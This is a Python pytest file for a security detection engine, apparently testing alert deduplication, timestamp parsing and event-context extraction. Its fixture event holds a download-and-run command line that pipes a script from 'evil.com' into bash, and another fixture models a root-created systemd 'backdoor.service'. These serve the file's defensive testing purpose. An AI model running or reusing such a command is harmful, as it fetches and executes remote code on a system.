from datetime import datetime, timezone, timedelta
from unittest.mock import MagicMock, patch
from app.detection.engine.active_runner import (
    _get_technique_id,
    _extract_event_epoch,
    _build_event_context,
    build_yaml_alert_dedup_key,
    is_duplicate_yaml_alert,
    YAML_DEDUP_WINDOW_SECONDS,
)


def test_dict_form_returns_id():
    assert _get_technique_id({"technique": {"id": "T1059.004", "name": "Unix Shell"}}) == "T1059.004"


def test_string_form_returned_as_is():
    assert _get_technique_id({"technique": "T1059"}) == "T1059"


def test_missing_technique_key_returns_empty():
    assert _get_technique_id({}) == ""


def test_empty_dict_value_returns_empty():
    assert _get_technique_id({"technique": {}}) == ""


# ---------------------------------------------------------------------------
# Shared fixture event
# ---------------------------------------------------------------------------

_T1059_EVENT = {
    "agent_id": "agent-abc",
    "message": "some raw log",
    "process": {"name": "bash", "command_line": "curl http://evil.com/s.sh | bash"},
    "hostname": "host-1",
}


# ---------------------------------------------------------------------------
# _extract_event_epoch
# ---------------------------------------------------------------------------

class TestExtractEventEpoch:

    def test_uses_at_timestamp_iso_z(self):
        event = {"@timestamp": "2024-01-15T10:00:00Z"}
        epoch = _extract_event_epoch(event)
        expected = datetime.fromisoformat("2024-01-15T10:00:00+00:00").timestamp()
        assert abs(epoch - expected) < 1.0

    def test_falls_back_to_timestamp_float(self):
        event = {"timestamp": 1_700_000_040.0}
        assert _extract_event_epoch(event) == 1_700_000_040.0

    def test_falls_back_to_event_created(self):
        event = {"event": {"created": "2024-01-15T10:00:00+00:00"}}
        expected = datetime.fromisoformat("2024-01-15T10:00:00+00:00").timestamp()
        assert abs(_extract_event_epoch(event) - expected) < 1.0

    def test_at_timestamp_takes_priority_over_timestamp(self):
        event = {"@timestamp": "2024-01-15T10:00:00Z", "timestamp": 1_000_000_000.0}
        epoch = _extract_event_epoch(event)
        expected = datetime.fromisoformat("2024-01-15T10:00:00+00:00").timestamp()
        assert abs(epoch - expected) < 1.0

    def test_naive_datetime_string_treated_as_utc(self):
        # No tzinfo in the string — must not raise, must return UTC-equivalent
        event = {"@timestamp": "2024-01-15T10:00:00"}
        epoch = _extract_event_epoch(event)
        expected = datetime(2024, 1, 15, 10, 0, 0, tzinfo=timezone.utc).timestamp()
        assert abs(epoch - expected) < 1.0

    def test_falls_back_to_utcnow_when_no_timestamp(self):
        event = {}
        with patch("app.detection.engine.active_runner.datetime") as mock_dt:
            mock_dt.utcnow.return_value.timestamp.return_value = 1_700_000_040.0
            epoch = _extract_event_epoch(event)
        assert epoch == 1_700_000_040.0


# ---------------------------------------------------------------------------
# build_yaml_alert_dedup_key
# ---------------------------------------------------------------------------

class TestBuildYamlAlertDedupKey:

    def test_key_has_five_colon_separated_parts(self):
        key = build_yaml_alert_dedup_key("agent-1", "rule-1", _T1059_EVENT)
        assert len(key.split(":")) == 5

    def test_key_starts_with_yaml_and_encodes_ids(self):
        key = build_yaml_alert_dedup_key("agent-xyz", "rule-T1059", _T1059_EVENT)
        assert key.startswith("yaml:agent-xyz:rule-T1059:")

    def test_content_hash_is_16_hex_chars(self):
        key = build_yaml_alert_dedup_key("a", "r", _T1059_EVENT)
        content_hash = key.split(":")[3]
        assert len(content_hash) == 16
        assert all(c in "0123456789abcdef" for c in content_hash)

    def test_command_line_takes_priority_over_message(self):
        event_cmd = {"process": {"command_line": "curl | bash"}, "message": "msg"}
        event_msg = {"process": {}, "message": "msg"}
        k1 = build_yaml_alert_dedup_key("a", "r", event_cmd)
        k2 = build_yaml_alert_dedup_key("a", "r", event_msg)
        assert k1 != k2

    def test_fallback_to_empty_string_hashes_deterministically(self):
        import hashlib
        event = {}
        key = build_yaml_alert_dedup_key("a", "r", event)
        expected_hash = hashlib.sha256(b"").hexdigest()[:16]
        assert key.split(":")[3] == expected_hash

    def test_event_timestamp_used_for_bucket(self):
        event = {"@timestamp": "2023-11-14T22:14:00Z", "process": {"command_line": "cmd"}}
        key = build_yaml_alert_dedup_key("a", "r", event)
        bucket_epoch = int(key.split(":")[4])
        expected_ts = datetime.fromisoformat("2023-11-14T22:14:00+00:00").timestamp()
        expected_bucket = int(expected_ts / YAML_DEDUP_WINDOW_SECONDS) * YAML_DEDUP_WINDOW_SECONDS
        assert bucket_epoch == expected_bucket

    def test_same_inputs_same_bucket_produce_same_key(self):
        with patch("app.detection.engine.active_runner.datetime") as mock_dt:
            mock_dt.utcnow.return_value.timestamp.return_value = 1_700_000_040.0
            k1 = build_yaml_alert_dedup_key("a1", "r1", _T1059_EVENT)
            k2 = build_yaml_alert_dedup_key("a1", "r1", _T1059_EVENT)
        assert k1 == k2

    def test_different_bucket_produces_different_key(self):
        event = {"process": {"command_line": "ls -la"}}
        with patch("app.detection.engine.active_runner.datetime") as mock_dt:
            mock_dt.utcnow.return_value.timestamp.return_value = 1_700_000_040.0
            key_early = build_yaml_alert_dedup_key("a", "r", event)
        with patch("app.detection.engine.active_runner.datetime") as mock_dt:
            mock_dt.utcnow.return_value.timestamp.return_value = 1_700_000_100.0
            key_later = build_yaml_alert_dedup_key("a", "r", event)
        assert key_early != key_later

    def test_bucket_epoch_is_floor_of_60s_window(self):
        # 1_700_000_077 is 37s into the bucket starting at 1_700_000_040
        event = {"process": {"command_line": "cmd"}}
        with patch("app.detection.engine.active_runner.datetime") as mock_dt:
            mock_dt.utcnow.return_value.timestamp.return_value = 1_700_000_077.0
            key = build_yaml_alert_dedup_key("a", "r", event, bucket_seconds=60)
        bucket_epoch = int(key.split(":")[4])
        assert bucket_epoch % 60 == 0
        assert bucket_epoch == 1_700_000_040  # int(1_700_000_077/60)*60 = 28333334*60


# ---------------------------------------------------------------------------
# is_duplicate_yaml_alert
# ---------------------------------------------------------------------------

class TestIsDuplicateYamlAlert:

    def _db(self, first):
        m = MagicMock()
        m.query.return_value.filter.return_value.first.return_value = first
        return m

    def test_returns_true_when_alert_exists(self):
        assert is_duplicate_yaml_alert("some-key", self._db(MagicMock())) is True

    def test_returns_false_when_no_alert(self):
        assert is_duplicate_yaml_alert("some-key", self._db(None)) is False

    def test_queries_alert_model(self):
        from app import models
        db = self._db(None)
        is_duplicate_yaml_alert("key", db)


# ---------------------------------------------------------------------------
# _build_event_context
# ---------------------------------------------------------------------------

class TestBuildDetectionMetadataEventContext:

    def _t1543_event(self):
        return {
            "file": {"path": "/etc/systemd/system/backdoor.service", "name": "backdoor.service"},
            "process": {"name": "bash", "command_line": "bash", "executable": "/bin/bash"},
            "user": {"name": "root"},
            "host": {"name": "prod1"},
            "event": {"action": "created"},
            "audit": {"event_id": "1710000000.123:456"},
        }

    def test_includes_file_path(self):
        ctx = _build_event_context(self._t1543_event())
        assert ctx["file.path"] == "/etc/systemd/system/backdoor.service"

    def test_includes_process_name(self):
        ctx = _build_event_context(self._t1543_event())
        assert ctx["process.name"] == "bash"

    def test_includes_event_action(self):
        ctx = _build_event_context(self._t1543_event())
        assert ctx["event.action"] == "created"

    def test_includes_audit_event_id(self):
        ctx = _build_event_context(self._t1543_event())
        assert ctx["audit.event_id"] == "1710000000.123:456"

    def test_omits_missing_fields(self):
        event = {
            "file": {"path": "/etc/systemd/system/backdoor.service"},
            "process": {"name": "bash"},
        }
        ctx = _build_event_context(event)
        assert "process.executable" not in ctx
        assert "user.name" not in ctx
        assert "audit.event_id" not in ctx

    def test_empty_event_returns_empty_dict(self):
        ctx = _build_event_context({})
        assert ctx == {}

    def test_host_name_falls_back_to_hostname_key(self):
        event = {"hostname": "fallback-host"}
        ctx = _build_event_context(event)
        assert ctx["host.name"] == "fallback-host"

    def test_host_name_prefers_host_dict(self):
        event = {"host": {"name": "primary-host"}, "hostname": "fallback-host"}
        ctx = _build_event_context(event)
        assert ctx["host.name"] == "primary-host"
